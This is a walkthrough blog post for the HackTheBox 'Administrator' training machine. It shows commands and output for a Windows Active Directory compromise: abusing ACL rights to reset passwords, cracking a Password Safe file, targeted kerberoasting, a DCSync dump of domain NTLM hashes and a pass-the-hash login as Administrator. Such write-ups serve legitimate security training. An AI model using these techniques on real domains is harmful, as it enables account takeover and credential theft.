---
title: "HackTheBox - Administrator"
author: Nasrallah
description: ""
date: 2025-04-21 12:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, activedirectory, ad, bloodhound, john, hashcat]
img_path: /assets/img/hackthebox/machines/administrator
image:
    path: administrator.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Administrator](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/administrator) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) is pure active directory challenges showcasing multiple misconfigurations.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.42
Host is up (0.25s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-01 14:07:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m02s
| smb2-time: 
|   date: 2024-12-01T14:07:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any 
```

The target is a windows domain controller. One unusual port we see here is 21 running FTP.

We were provided with the credentials `olivia:ichliebedich` so we are going to privilege escalation directly.

Don't forget to add the domain `administrator.htb` to `/etc/hosts` file.

## **Privilege Escalation**

### Olivia -> Michael

We can connect as olivia using `evil-winrm` and get a shell.

```terminal
[★]$ evil-winrm -i 10.10.11.42 -u olivia -p ichliebedich                                                                                                                                  

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

The first thing we do is run `SharpHound` to see what we have.

```terminal
*Evil-WinRM* PS C:\Users\olivia\documents> upload SharpHound.exe                                                                                                                              
                                                                                                                                                                                              
Info: Uploading /home/sirius/ctf/htb/admin/SharpHound.exe to C:\Users\olivia\documents\SharpHound.exe                                                                                         
                                                                                                                                                                                              
Data: 1395368 bytes of 1395368 bytes copied                                                                                                                                                   
                                                                                               
Info: Upload successful!                                                                                                                                                                      
*Evil-WinRM* PS C:\Users\olivia\documents> .\SharpHound.exe                                                                                                                                   
2024-12-01T07:23:34.4924226-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound                                                                   
2024-12-01T07:23:34.6330590-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote                   
2024-12-01T07:23:34.6491127-08:00|INFORMATION|Initializing SharpHound at 7:23 AM on 12/1/2024                                                                                                 
2024-12-01T07:23:34.7580529-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for administrator.htb : dc.administrator.htb                                                
2024-12-01T07:23:34.8986782-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote                                         
2024-12-01T07:23:35.0549187-08:00|INFORMATION|Beginning LDAP search for administrator.htb      
2024-12-01T07:23:35.0861605-08:00|INFORMATION|Producer has finished, closing LDAP channel                                                                                                     
2024-12-01T07:23:35.1017863-08:00|INFORMATION|LDAP channel closed, waiting for consumers                                                                                                      
2024-12-01T07:24:05.2268336-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-12-01T07:24:20.5392860-08:00|INFORMATION|Consumers finished, closing output channel                                                                                                      
2024-12-01T07:24:20.5705343-08:00|INFORMATION|Output channel closed, waiting for output task to complete                                                                                      
Closing writers                                                                                                                                                                               
2024-12-01T07:24:20.7424137-08:00|INFORMATION|Status: 97 objects finished (+97 2.155555)/s -- Using 44 MB RAM                                                                                 
2024-12-01T07:24:20.7424137-08:00|INFORMATION|Enumeration finished in 00:00:45.7034296                                                                                                        
2024-12-01T07:24:20.8362288-08:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.                                                                                                
 57 name to SID mappings.                                                                                                                                                                     
 0 machine sid mappings.                                                                                                                                                                      
 2 sid to domain mappings.                                                                                                                                                                    
 0 global catalog mappings.                                                                                                                                                                   
2024-12-01T07:24:20.8362288-08:00|INFORMATION|SharpHound Enumeration Completed at 7:24 AM on 12/1/2024! Happy Graphing!
```

Now we just download the zip file and open in in bloodhound.

![olivia](1.png)

checking Olivia's first degree object control we find she has `GenericAll` over user `michael`.

This privilege allows is to manipulate the target object `michael` however we wish.

We can just reset his password using the following command.

```shell
net user michael Pass123word /domain
```

Or we can also use the following command from our machine.

```bash
net rpc password "michael" "Pass123word" -U "administrator.htb"/"olivia"%"ichliebedich" -S "administrator.htb"
```

Great! Now we run `gpupdate /force` to update the group policy.

And now we can log in as `michael` using `evil-winrm`

```terminal
[★]$ evil-winrm -i 10.10.11.42 -u michael -p Pass123word
                                         
Evil-WinRM shell v3.5
                                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents>
```

### Michael -> Benjamin

Now back to bloodhound, let's see what user `michael` can do.

![michael](2.png)

`michael` has the `ForceChangePassword` over the user `benjamin`.

Let's change the user's password again, but let's use another method.

We upload `PowerView.ps1` and import it.

```powershell
Import-Module .\PowerView.ps1
```

Now we run the following commands.

```powershell
$SecPassword = ConvertTo-SecureString 'Pass123word' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\michael', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```

The `net rpc` command also works.

Another one is with `rpcclient`.

```terminal
[★]$ rpcclient -U michael 10.10.11.42
Password for [WORKGROUP\michael]:
rpcclient $> setuserinfo2 benjamin 23 'Password123'
```

We changed the password to `Password123` but I couldn't login via winrm, this is because `benjamin` is not part of the `Remote Management Users`.

### Benjamin -> Emily

We found with nmap that `FTP` is open. Let's see what we can find there.

```terminal
[★]$ ftp 10.10.11.42                                                                                                                                                                      
Connected to 10.10.11.42.                                                                                                                                                                     
220 Microsoft FTP Service                                                                                                                                                                     
Name (10.10.11.42:sirius): benjamin                                                                                                                                                           

331 Password required                                                                                                                                                                         
Password:
230 User logged in.                                                                                                                                                                           
Remote system type is Windows_NT.                                                                                                                                                             
ftp> ls
229 Entering Extended Passive Mode (|||54808|)                                                                                                                                                
125 Data connection already open; Transfer starting.                                                                                                                                          
10-05-24  08:13AM                  952 Backup.psafe3                                                                                                                                          
226 Transfer complete.                                                                                                                                                                        
ftp> get Backup.psafe3                                                                                                                                                                        
local: Backup.psafe3 remote: Backup.psafe3                                                                                                                                                    
229 Entering Extended Passive Mode (|||54811|)                                                                                                                                                
125 Data connection already open; Transfer starting.                                                                                                                                          
100% |*************************************************************************************************************************************************|   952        3.22 KiB/s    00:00 ETA 
226 Transfer complete.                                                                                                                                                                        
WARNING! 3 bare linefeeds received in ASCII mode.                                                                                                                                             
File may not have transferred correctly.                                                                                                                                                      
952 bytes received in 00:00 (2.26 KiB/s)
ftp> exit
221 Goodbye.                                                    
```

We found the file `Backup.psafe3`, it's a database file, we can use `passwordsafe` to read it but we need a password to unlock it first.

We can use `pwsafe2john` to get the hash.

```terminal
[★]$ pwsafe2john Backup.psafe3              
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

Now let's crack it using `john`.

```terminal
[★]$ sudo john -w=/usr/share/wordlists/rockyou.txt psafe.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2024-12-02 11:58) 3.333g/s 27306p/s 27306c/s 27306C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Great! We got the password, now let's read the db file.

![db](3.png)

We found 3 passwords, but the one we're interested in is `emily` because it's the only user I can see on `C:/users` folder.

Let's try logging in using `evil-winrm`

```terminal
[★]$ evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb                                                                                                                  
                                                                                               
Evil-WinRM shell v3.5                                                                                                                                                                         
                                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                                                                               
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                         
                                         
Info: Establishing connection to remote endpoint                                               
*Evil-WinRM* PS C:\Users\emily\Documents>
```

### Emily -> Ethan

We go back to bloodhound to see what we can do as `emily`.

![emily](4.png)

Emily has `GenericWrite` over `Ethan`.

>Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.
{: .prompt-info }

Let's create a serviceprinciplename for user `ethan` which would allow us to perform a `kerberoast` attack to get ethan's password hash.

We import `PowerView.ps1` again and run the following commands.

```powershell
$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\emily', $SecPassword)
Set-DomainObject -Credential $Cred -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
Get-DomainSPNTicket -Credential $Cred ethan | fl
```

The last command didn't really work with me so I used [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).

```terminal
[★]$ python targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'                                                                                 
[*] Starting kerberoast attacks                                                                                                                                                               
[*] Fetching usernames from Active Directory with LDAP                                                                                                                                        
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)                                                                                                                              
Traceback (most recent call last):                                                                                                                                                            
  File "/home/sirius/ctf/htb/admin/targetedKerberoast/targetedKerberoast.py", line 593, in main                                                                                               
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,                      
                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 318, in getKerberosTGT                                                                                              
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)                                                                                                                                 
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                                                                                                                 
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 91, in sendReceive                                                                                                  
    raise krbError                                                                                                                                                                            
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)         
```

I got an error about the clock time. This happens always with kerberos and we can easily fix it by changing the time on our machine to the one's of the target using `rdate -n administrator.htb`

```terminal
[★]$ sudo rdate -n administrator.htb | python targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'                                               
[*] Starting kerberoast attacks                                                                                                                                                               
[*] Fetching usernames from Active Directory with LDAP                                                                                                                                        
[+] Printing hash for (ethan)                                                                                                                                                                 
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$ea5a560cdaeebae46284fb8b20819839$1387580950c8da724307d3220dd5043ca55331e76ea430e307cc21885ba8fe6efd4c32c2f8e39373f04dce3e90a259f2be986d6dca1870e25e6a97aed42a603109ae922657470b2a4bb2fbe89398518319282b2d321069ab46b2aea72aab61786bb02b76f26487c58b7419b455c62f9e21e17ea40d65f9b437f2dbf1784bd23a5f61c1fbff51ef969b7bca57783fe8a7a2e78f5d8a3eb976a4bcfa5c6bf45864f213021f13e535f656e1d7347d78127743a18107ddcf3312f7d14ec19999466f2977fb2d356f54b20df737ff046d481e67e03a7c7dd28cf39d7acf2c0488304b4583909705f6696273700bed5481b81dfafefc91f58acba94f94b7e638d7a3a95e62aca8d56c764086505b461f47ee52918a4ef6995728be55eaf1235d302de38265b5d00b8af5d80b6bd17db4c8fcc0573e0f56064dad2d6c6f3f019bd9673d8ffe3bd47d09d4061979be3895595e94198452ddea993abfeba0c0f813f31243e7054e3a3b6dfed50d88ccc436e50cd528772984041b0a46e985021dfd342714b7fc9f2af37fefd1096216a5a3a1c4926703df0ddee9bf48335e762e2c7dc08498524d4732b1feb2ce2c5bb3fd67738901cf5279c72a1efa0efcf906de4dc5ea8025674fcd5fd57cc4e399f61ad2badf902b46d255819c34eba82e3af643935c331ca3579876bf542840c2b58e71a57afa127123a147ab4cfec501ff8d9177d20d586cad5365e055bd5b24e1f9c77e9ee76ed3337bd172033830ed558d668a4592cb475dae0bd1f35c67898c19da5eb6018ac726eca3f18b44d747532da89bdce072f185c667e247d7efd8b7609d7482b115d386ab869008bba1a53bf8e245db8c3f9f08def79905b4c81f476a43b6c4280d98f32c82576a3537aa5ac0eebed121caadd246d78175be47e701d13a19fcc90d444e83413335fd03e113e68bf1e9fdc20720f8a7193075e30a2022f922a4da8cc81f9f04ca6ad925fcbad6839811ba4d16c8694ac5abad3b2f3fe2708ab33680cbb95f34528c9168c33aaaaba9eb71bfcc4851d660d0036845b8d0b1bcaf26a72bd15a83f5297199e496a8ecc6eb07b3e953fd6f55e4651baa3418e3dba8740fa6c50b7b0f3b57ae6079ad5309ca10748d7789103209a918a54143fa10d1e0e67ebadd11a425b5eb2582fca6412b0c5fd41e69c52ba5d9fc1b83be099ac7c5c8ee1b8f9c9015b56914badc990e94fe8b69fe64fa31fe521195d4698e6488a0bb2b693deb2f664dc842f8c053e66c1a7125de50285fbbf15b4f48315cc2c6df4cff6302e5d425a5af92b441595ab3c45c828bf60e4619c41c96585a03a6baf89c4a2535176ec4a3c499f89e61aef4054f3a4c951011afdf3f780e8778381067536a4b54cc7dbe53bf3d70db7c77621c79ffa6d8ba0b9ed790fba61b16aedb3d4f6e0e4e19d091b1b0e5058e5223b1efe7a6245bc0e0b1c121f094c3ec6d45d589fdaea9cf4ef921a8d1f89c93fd258d2a34f4503392996880413c6645cd7062a077fab9038bf46dc7b5b9d6937e
```

We got the hash, now let's crack it using `hashcat` with the mod 13100

```terminal
λ hashcat  hashes.txt rockyou.txt -m 13100
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
Host memory required for this attack: 210 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$ea5a560cdaeebae46284fb8b20819839$1387580950c8da724307d3220dd5043ca55331e76ea430e307cc21885ba8fe6efd4c32c2f8e39373f04dce3e90a259f2be986d6dca1870e25e6a97aed42a603109ae922657470b2a4bb2fbe89398518319282b2d321069ab46b2aea72aab61786bb02b76f26487c58b7419b455c62f9e21e17ea40d65f9b437f2dbf1784bd23a5f61c1fbff51ef969b7bca57783fe8a7a2e78f5d8a3eb976a4bcfa5c6bf45864f213021f13e535f656e1d7347d78127743a18107ddcf3312f7d14ec19999466f2977fb2d356f54b20df737ff046d481e67e03a7c7dd28cf39d7acf2c0488304b4583909705f6696273700bed5481b81dfafefc91f58acba94f94b7e638d7a3a95e62aca8d56c764086505b461f47ee52918a4ef6995728be55eaf1235d302de38265b5d00b8af5d80b6bd17db4c8fcc0573e0f56064dad2d6c6f3f019bd9673d8ffe3bd47d09d4061979be3895595e94198452ddea993abfeba0c0f813f31243e7054e3a3b6dfed50d88ccc436e50cd528772984041b0a46e985021dfd342714b7fc9f2af37fefd1096216a5a3a1c4926703df0ddee9bf48335e762e2c7dc08498524d4732b1feb2ce2c5bb3fd67738901cf5279c72a1efa0efcf906de4dc5ea8025674fcd5fd57cc4e399f61ad2badf902b46d255819c34eba82e3af643935c331ca3579876bf542840c2b58e71a57afa127123a147ab4cfec501ff8d9177d20d586cad5365e055bd5b24e1f9c77e9ee76ed3337bd172033830ed558d668a4592cb475dae0bd1f35c67898c19da5eb6018ac726eca3f18b44d747532da89bdce072f185c667e247d7efd8b7609d7482b115d386ab869008bba1a53bf8e245db8c3f9f08def79905b4c81f476a43b6c4280d98f32c82576a3537aa5ac0eebed121caadd246d78175be47e701d13a19fcc90d444e83413335fd03e113e68bf1e9fdc20720f8a7193075e30a2022f922a4da8cc81f9f04ca6ad925fcbad6839811ba4d16c8694ac5abad3b2f3fe2708ab33680cbb95f34528c9168c33aaaaba9eb71bfcc4851d660d0036845b8d0b1bcaf26a72bd15a83f5297199e496a8ecc6eb07b3e953fd6f55e4651baa3418e3dba8740fa6c50b7b0f3b57ae6079ad5309ca10748d7789103209a918a54143fa10d1e0e67ebadd11a425b5eb2582fca6412b0c5fd41e69c52ba5d9fc1b83be099ac7c5c8ee1b8f9c9015b56914badc990e94fe8b69fe64fa31fe521195d4698e6488a0bb2b693deb2f664dc842f8c053e66c1a7125de50285fbbf15b4f48315cc2c6df4cff6302e5d425a5af92b441595ab3c45c828bf60e4619c41c96585a03a6baf89c4a2535176ec4a3c499f89e61aef4054f3a4c951011afdf3f780e8778381067536a4b54cc7dbe53bf3d70db7c77621c79ffa6d8ba0b9ed790fba61b16aedb3d4f6e0e4e19d091b1b0e5058e5223b1efe7a6245bc0e0b1c121f094c3ec6d45d589fdaea9cf4ef921a8d1f89c93fd258d2a34f4503392996880413c6645cd7062a077fab9038bf46dc7b5b9d6937e:limpbizkit

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....d6937e
Time.Started.....: Mon Dec 02 12:26:24 2024 (0 secs)
Time.Estimated...: Mon Dec 02 12:26:24 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1432.3 kH/s (7.37ms) @ Accel:16 Loops:1 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344384 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> havana
```

We got ethan's password, but we also can't login via `winrm`.

### Ethan -> Administrator

Let's go one last time to bloodhound as see what we have.

![ethan](5.png)

Bloodhound shows that we can perform a `DCSync` attack. Let's do it.

```terminal
[★]$ impacket-secretsdump ethan:limpbizkit@10.10.11.42                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                       
                                                                                               
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                            
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                       
[*] Using the DRSUAPI method to get NTDS.DIT secrets    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::                                                                                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
```

We got the administrator hash, now we can perform pass-the-hash attack to login as administrator.

```terminal
[★]$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
aeaac903239cbb7043255b800fb2eab2
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
